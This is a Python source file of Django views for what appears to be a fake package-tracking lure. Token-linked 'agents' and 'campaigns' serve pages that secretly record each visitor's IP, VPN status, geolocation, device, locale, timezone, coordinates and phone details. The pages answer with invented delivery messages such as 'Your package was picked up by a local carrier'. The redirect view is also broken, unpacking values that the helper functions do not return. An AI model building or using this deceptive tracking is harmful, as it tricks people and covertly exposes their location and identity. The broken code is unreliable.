import base64
import json
from config import settings
from tracking.api import IPGeolocationApiClient, IPGeolocationResponse, SecurityInfo, TwilioApiClient, UserStackApiClient, UserStackResponse, VpnApiClient
from tracking.models import Campaign, TrackingData, Agent
from tracking.common import TrackingType
from django.utils.timezone import localtime, now
from django.http import HttpRequest, JsonResponse, HttpResponse
from django.views.decorators.csrf import csrf_exempt
from django.shortcuts import render, get_object_or_404
from django.utils.dateparse import parse_datetime
from typing import Optional
from ipware import get_client_ip
from pydantic import BaseModel, Field
from datetime import datetime, timezone
from zoneinfo import ZoneInfo


class IpAddressInfo(BaseModel):
    address: Optional[str] = None
    is_routable: bool = False

class IpData(BaseModel):
    server_ip: IpAddressInfo = Field(default_factory=IpAddressInfo)
    header_ip: IpAddressInfo = Field(default_factory=IpAddressInfo)
    selected_ip: Optional[str] = None
    source: Optional[str] = None
    info: Optional[IPGeolocationResponse] = None
    security: Optional[SecurityInfo] = None

    def to_json(self) -> str:
        return json.dumps(self.model_dump(), sort_keys=True, ensure_ascii=True)

class UserAgentData(BaseModel):
    server_user_agent: str
    header_user_agent: str
    selected_user_agent: Optional[str] = None
    source: Optional[str] = None
    info: Optional[UserStackResponse] = None

    def get_os_name(self) -> Optional[str]:
        return self.info.os.name if self.info and self.info.os else None

    def get_browser_name(self) -> Optional[str]:
        return self.info.browser.name if self.info and self.info.browser else None

    def get_platform_type(self) -> Optional[str]:
        return self.info.device.type if self.info and self.info.device else None

    def has_user_agent_mismatch(self) -> bool:
        return self.server_user_agent != self.header_user_agent

    def to_json(self) -> str:
        return json.dumps(self.model_dump(), sort_keys=True, ensure_ascii=True)

class LocaleData(BaseModel):
    server_locale: str
    header_locale: str
    selected_locale: Optional[str] = None
    source: Optional[str] = None
    info: Optional[str] = None

# Location Data
class LocationInfo(BaseModel):
    latitude: Optional[str] = None
    longitude: Optional[str] = None

class LocationData(BaseModel):
    server_location: LocationInfo = Field(default_factory=LocationInfo)
    header_location: LocationInfo = Field(default_factory=LocationInfo)
    selected_location: Optional[LocationInfo] = None
    source: Optional[str] = None

# Time Data
class TimeData(BaseModel):
    server_timezone: Optional[str] = None
    header_timezone: Optional[str] = None
    selected_timezone: Optional[str] = None
    source: Optional[str] = None
    info: Optional[datetime] = None

# Header Data
class NavigatorInfo(BaseModel):
    connection: str = Field(default='unknown')
    language: str = Field(default='unknown')
    user_agent: str = Field(default='unknown')

class DateTimeInfo(BaseModel):
    iso: str
    readable: str
    timestamp: int
    timezone: str

class ISPInfo(BaseModel):
    hostname: Optional[str] = None
    org: Optional[str] = None

class AddressInfo(BaseModel):
    city: Optional[str] = None
    region: Optional[str] = None
    country: Optional[str] = None
    postal: Optional[str] = None

class HeaderIpInfo(BaseModel):
    ip: str
    isp: ISPInfo = Field(default_factory=ISPInfo)
    address: AddressInfo = Field(default_factory=AddressInfo)
    location: LocationInfo = Field(default_factory=LocationInfo)
    connection_type: str = Field(default='unknown')

class TrackingHeaderData(BaseModel):
    navigator: NavigatorInfo = Field(default_factory=NavigatorInfo)
    datetime: DateTimeInfo
    public_ip: Optional[HeaderIpInfo] = None

    def to_json(self) -> str:
        return json.dumps(self.model_dump(), sort_keys=True, ensure_ascii=True)


def get_server_ip(request) -> str:
    client_ip, is_routable = get_client_ip(request)
    if client_ip is None:
        return None, False
    elif is_routable:
        # The client's IP address is publicly routable on the Internet
        return client_ip, True
    else:
        # The client's IP address is private
        return client_ip, False


def get_tracking_header(request: HttpRequest) -> TrackingHeaderData:
    """Extract and decode tracking data from request headers."""
    try:
        # Get the header
        header_value = request.headers.get('x-tracking-payload', None)
        
        if header_value is None:
            raise ValueError('No header sent')
        
        # Base64-decode (ensure padding is correct)
        decoded_bytes = base64.b64decode(header_value + '===')
        decoded_str = decoded_bytes.decode('utf-8')

        # Parse JSON and validate with Pydantic
        data = json.loads(decoded_str)

        return TrackingHeaderData(**data)
        
    except (ValueError, json.JSONDecodeError, base64.binascii.Error) as e:
        print('Error processing tracking headers:', str(e))
        # Return a valid but empty tracking header structure
        return TrackingHeaderData(
            navigator=NavigatorInfo(
                user_agent=request.META.get('HTTP_USER_AGENT', 'unknown')
            ),
            datetime=DateTimeInfo(
                iso=now().isoformat(),
                readable=str(now()),
                timestamp=int(now().timestamp() * 1000),
                timezone='UTC'
            )
        )


def get_ip_data(request: HttpRequest, headers_data: TrackingHeaderData) -> IpData:
    """Extract and process IP data from request and headers."""
    # Get IP from headers (ipinfo.io)
    header_ip_address: Optional[str] = headers_data.public_ip.ip if headers_data.public_ip else None
    
    # Get server IP for backup
    server_ip_address: Optional[str]
    is_routable: bool
    server_ip_address, is_routable = get_server_ip(request)
    
    # Store both IPs in the data
    ip_data = IpData(**{
        'server_ip': {
            'address': server_ip_address,
            'is_routable': is_routable
        },
        'header_ip': {
            'address': header_ip_address,
            'is_routable': True  # Header IP is always public
        },
        'selected_ip': None,
        'source': None,
        'info': None
    })

    # Always use header IP if available, otherwise fall back to server IP
    selected_ip: Optional[str] = None
    ip_source: Optional[str] = None
    
    if header_ip_address:
        selected_ip = header_ip_address
        ip_source = TrackingType.CLIENT
    elif server_ip_address:
        selected_ip = server_ip_address
        ip_source = TrackingType.SERVER

    # Add selected IP information
    if selected_ip:
        ip_data.source = ip_source
        ip_data.selected_ip = selected_ip

        # Get IP data from IPGeolocation
        ipGeolocationClient = IPGeolocationApiClient(settings.IP_GEO_LOCATION_KEY)
        ip_data.info = ipGeolocationClient.get_data(selected_ip)

        vpnClient = VpnApiClient(settings.VPN_API_IO_KEY)
        vpnData = vpnClient.get_data(selected_ip)
        ip_data.security = vpnData.security
        print(f"vpn data: {vpnData}")

    return ip_data


def get_user_agent_data(request: HttpRequest, headers_data: TrackingHeaderData) -> UserAgentData:
    """Extract and process user agent data from request."""
    # Get user agent from different sources
    server_user_agent: str = request.META.get('HTTP_USER_AGENT', '')
    header_user_agent: str = headers_data.navigator.user_agent
    
    # Store both user agents in the data
    user_agent_data = UserAgentData(**{
        'server_user_agent': server_user_agent,
        'header_user_agent': header_user_agent,
        'selected_user_agent': None,
        'source': None,
        'info': None
    })

    # Always use header user agent if available, otherwise fall back to server user agent
    selected_user_agent: Optional[str] = None
    user_agent_source: Optional[str] = None
    
    if header_user_agent:
        selected_user_agent = header_user_agent
        user_agent_source = TrackingType.CLIENT
    elif server_user_agent:
        selected_user_agent = server_user_agent
        user_agent_source = TrackingType.SERVER

    # Add selected user agent information
    if selected_user_agent:
        user_agent_data.selected_user_agent = selected_user_agent
        user_agent_data.source = user_agent_source
        # Get user agent data from UserStack
        userstack_client = UserStackApiClient(api_key=settings.USER_STACK_KEY)
        user_agent_data.info = userstack_client.get_data(selected_user_agent)

    return user_agent_data


def get_locale_data(request: HttpRequest, headers_data: TrackingHeaderData) -> LocaleData:
    """Extract and process locale data from request and headers."""
    # Get locale from different sources
    server_locale: str = request.META.get('HTTP_ACCEPT_LANGUAGE', ',').split(',')[0]
    header_locale: str = headers_data.navigator.language
    
    # Store both locales in the data
    locale_data = LocaleData(**{
        'server_locale': server_locale,
        'header_locale': header_locale,
        'selected_locale': None,
        'source': None,
        'info': None
    })

    # Always use header locale if available, otherwise fall back to server locale
    selected_locale: Optional[str] = None
    locale_source: Optional[str] = None
    
    if header_locale:
        selected_locale = header_locale
        locale_source = TrackingType.CLIENT
    elif server_locale:
        selected_locale = server_locale
        locale_source = TrackingType.SERVER

    # Add selected locale information
    if selected_locale:
        locale_data.selected_locale = selected_locale
        locale_data.source = locale_source
    
    return locale_data


def get_time_data(request: HttpRequest, headers_data: TrackingHeaderData, ip_data: IpData) -> TimeData:
    """Extract and process time and timezone data from request, headers, and IP data."""
    # Get timezone
    timestamp: int = int(headers_data.datetime.timestamp) if headers_data.datetime.timestamp else int(datetime.utcnow().timestamp() * 1000)
    header_timezone: str = headers_data.datetime.timezone
    ip_timezone: Optional[str] = ip_data.info.time_zone.name if ip_data and ip_data.info else None
    
    # Store time data
    time_data = TimeData(**{
        'header_timezone': header_timezone,
        'ip_timezone': ip_timezone,
        'selected_timezone': None,
        'source': None,
        'info': None
    })

    # Use header time if available and valid, otherwise use server time
    time_source: Optional[str] = None
    selected_timezone: Optional[str] = None
    
    if header_timezone:
        time_source = TrackingType.CLIENT
        selected_timezone = header_timezone
    elif ip_timezone:
        time_source = TrackingType.SERVER
        selected_timezone = ip_timezone

    if selected_timezone:
        client_time = datetime.fromtimestamp(timestamp / 1000, tz=timezone.utc)
        time_data.selected_timezone = selected_timezone
        time_data.source = time_source
        time_data.info = client_time.astimezone(ZoneInfo(selected_timezone))
    
    return time_data


def get_location_data(request: HttpRequest, headers_data: TrackingHeaderData, ip_data: IpData) -> LocationData:
    """Extract and process location data from request, headers, and IP data."""
    # Get location from different sources
    header_location: Optional[LocationInfo] = headers_data.public_ip.location if headers_data.public_ip else None
    
    # Get location from IP data if available
    ip_location: Optional[LocationInfo] = None
    if ip_data and ip_data.info:
        ip_location = LocationInfo(**{
            'latitude': ip_data.info.latitude,
            'longitude': ip_data.info.longitude
        })
    
    # Store both locations in the data
    location_data = LocationData(**{
        'header_location': header_location,
        'ip_location': ip_location,
        'selected_location': None,
        'source': None,
        'info': None
    })

    # Always use header location if available, otherwise fall back to IP location   
    selected_location: Optional[float] = None
    location_source: Optional[str] = None
    if header_location:
        selected_location = header_location
        location_source = TrackingType.CLIENT
    elif ip_location:
        selected_location = ip_location
        location_source = TrackingType.SERVER

    # Add selected location information
    if selected_location:
        location_data.selected_location = selected_location
        location_data.source = location_source

    return location_data


@csrf_exempt
def track_view(request: HttpRequest, token: Optional[str] = None) -> HttpResponse:
    if token and request.method == 'POST':
        # Add breakpoint for debugging
        agent = get_object_or_404(Agent, token=token)
        campaign = agent.campaign
        headers_data: TrackingHeaderData = get_tracking_header(request)
        http_method: str = request.POST.get('http_method', request.method)
        
        # Log the incoming data
        print(f"Headers data: {headers_data}")
        print(f"Request method: {http_method}")
        
        # Get IP data
        ip_data: IpData = get_ip_data(request, headers_data)
        print(f"ip data: {ip_data}")
        
        # Get user agent data
        user_agent_data: UserAgentData = get_user_agent_data(request, headers_data)
        
        # Get locale data
        locale_data: LocaleData = get_locale_data(request, headers_data)
        
        # Get time data
        time_data: TimeData = get_time_data(request, headers_data, ip_data)
        
        # Get location data
        location_data: LocationData = get_location_data(request, headers_data, ip_data)

        # Create tracking data
        TrackingData.objects.create(
            agent=agent,
            http_method=http_method,
            ip_address=ip_data.selected_ip,
            ip_source=ip_data.source,
            os=user_agent_data.get_os_name(),
            browser=user_agent_data.get_browser_name(),
            platform=user_agent_data.get_platform_type(),
            locale=locale_data.selected_locale,
            client_time=time_data.info,
            client_timezone=time_data.selected_timezone,
            latitude=location_data.selected_location.latitude,
            longitude=location_data.selected_location.longitude,
            location_source=location_data.source,
            tracking_data=headers_data.to_json(),
            ip_data=ip_data.to_json(),
            user_agent_data=user_agent_data.to_json(),
            headers_data=headers_data.to_json(),
            form_data=json.dumps(request.POST, sort_keys=True, ensure_ascii=True)
        )

        return JsonResponse({
            'status': 'success', 
            'message': '✅ Your package was picked up by a local carrier. It may take a few hours to arrive at the sorting facility.'
        })

    # For GET request: serve Django template
    return render(request, 'tracking/track.html', {})

@csrf_exempt
def redirect_package_view(request: HttpRequest, token: Optional[str] = None) -> HttpResponse:
    if token and request.method == 'POST':
        agent = get_object_or_404(Agent, token=token)
        headers_data = get_tracking_header(request)
        http_method = request.POST.get('http_method', request.method)
        notifications = request.POST.get('notifications')
        
        # Get IP data
        selected_ip, ip_source, ip_data = get_ip_data(request, headers_data)
        
        # Get user agent data
        selected_user_agent, user_agent_source, user_agent_data = get_user_agent_data(request, headers_data)
        
        # Get locale data
        selected_locale, locale_source, _ = get_locale_data(request, headers_data)
        
        # Get time data
        selected_time, time_source, selected_timezone, _ = get_time_data(request, headers_data, ip_data)
        
        # Get location data
        selected_latitude, selected_longitude, location_source, _ = get_location_data(
            request, headers_data, ip_data
        )

        # Handle notifications if provided
        phone_data = None
        if notifications:
            twilio_client = TwilioApiClient(settings.TWILIO_ACCOUNT_SID, settings.TWILIO_AUTH_TOKEN)
            phone_data = twilio_client.get_data(notifications)

        # Create tracking data
        TrackingData.objects.create(
            agent=agent,
            http_method=http_method,
            ip_address=selected_ip,
            ip_source=ip_source,
            user_agent=selected_user_agent,
            user_agent_source=user_agent_source,
            locale=selected_locale,
            locale_source=locale_source,
            client_time=selected_time,
            time_source=time_source,
            client_timezone=selected_timezone,
            latitude=selected_latitude,
            longitude=selected_longitude,
            location_source=location_source,
            tracking_data=getattr(request, 'tracking_payload', { 'message' : 'no tracking data' }),
            ip_data=ip_data,
            user_agent_data=user_agent_data,
            headers_data=headers_data,
            form_data=json.dumps(request.POST),
            phone_data=phone_data
        )

        return JsonResponse({
            'status': 'success', 
            'message': '✅ A request was sent to redirect your package. Please check your phone for updates we have sent you.'
        })

    return render(request, 'tracking/redirect.html', {})
